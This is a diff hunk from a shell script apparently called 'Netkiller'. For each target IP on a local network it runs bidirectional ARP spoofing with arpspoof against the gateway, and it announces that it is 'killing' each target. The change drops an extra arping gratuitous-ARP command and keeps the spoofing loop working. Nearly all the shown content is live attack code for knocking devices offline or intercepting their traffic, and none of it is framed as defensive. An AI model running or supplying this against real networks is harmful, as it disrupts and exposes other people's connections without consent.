@@ -165,12 +165,8 @@ for TARGET in $TARGET_IPS; do
         echo "Skipping $TARGET (matches gateway or device IP)."
         continue
     fi
-    (
-        # Bidirectional ARP Spoofing
-        arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
-        arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
-    ) &
-    echo "Netkiller killing the target IP: $TARGET"
+    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
+      echo "Netkiller killing the target IP: $TARGET"
 done
 
 echo ""
